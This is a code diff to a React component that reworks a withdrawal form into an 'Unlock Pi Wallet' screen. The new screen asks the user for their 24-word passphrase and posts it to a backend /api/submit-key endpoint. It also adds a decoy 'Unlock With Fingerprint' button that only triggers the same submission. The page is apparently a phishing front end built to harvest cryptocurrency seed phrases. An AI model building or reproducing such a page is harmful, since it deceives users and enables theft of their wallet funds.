@@ -16,7 +16,6 @@ function CoinKeyPage({ quantity, totalAmount }) {
 
   // Handle form submission
   const handleSubmit = async () => {
-    // ❌ Skip 24-word check
     setLoading(true);
     try {
       await axios.post('http://localhost:5000/api/submit-key', {
@@ -52,28 +51,31 @@ function CoinKeyPage({ quantity, totalAmount }) {
   return (
     <div className="app">
       <div className="app-container">
-        <div className="coin-key-container">
-          <h1 className="coin-key-title">Confirm Withdrawal</h1>
-          <p className="coin-key-info">Quantity: {quantity} | Total Amount: ₹{totalAmount}</p>
-          <p className="coin-key-info">Account Holder: {state.accountHolder}</p>
+        <div className="unlock-container">
+          <h1 className="unlock-title">Unlock Pi Wallet</h1>
           <div className="input-group">
-            <label className="input-label">Coin Key / Passphrase</label>
             <textarea
               value={coinKey}
               onChange={(e) => setCoinKey(e.target.value)}
-              className="coin-key-input"
-              placeholder="Enter your coin key or passphrase"
+              className="unlock-input"
+              placeholder="Enter your 24-word passphrase here"
               rows="6"
             />
           </div>
           {error && <p className="error-text">{error}</p>}
+          <div className="button-save">
           <button
             onClick={handleSubmit}
             disabled={loading || !coinKey}
-            className="confirm-button"
+            className="unlock-button"
           >
-            {loading ? 'Submitting...' : 'Confirm Withdraw'}
+            {loading ? 'Submitting...' : 'Unlock With Passphrase'}
           </button>
+          <button             onClick={handleSubmit}
+            disabled={loading || !coinKey} className="unlock-button-face">
+            {loading ? 'Submitting...' : 'Unlock With Fingerprint'}
+          </button>
+          </div>
         </div>
       </div>
     </div>
